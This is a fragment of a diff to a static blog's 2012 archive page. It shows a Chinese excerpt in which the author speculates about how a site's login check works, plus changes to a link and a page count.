更不知道他的具体写法, 目测的话应该是在判断登录与未登录的时候出现的问题, 可能在判断的时候用到了mysql查询, 然后把登陆成功用户状态的登录状态写入数据库, 当然以上只是猜想, 具体是咋回事暂且不清楚o(∩_∩)o~ 不过这里只是看上去登录进去了, 提示不欢迎我 = =.. 于是我又刷新了下, 就立马笑了<del></p><br>
       
       </p>
       
       <p>
-          <a href="/731.seo/" class="excerpt-link">Read More...</a>
+          <a href="/924.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -285,7 +259,7 @@ Mudule rewrite already enabled</pre>
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/archives/2012/page/5/">← Newer Posts</a>
-    <span class="page-number">Page 6 of 29</span>
+    <span class="page-number">Page 6 of 40</span>
     <a class="older-posts" href="/archives/2012/page/7/">Older Posts →</a>
   </nav>
 </main>
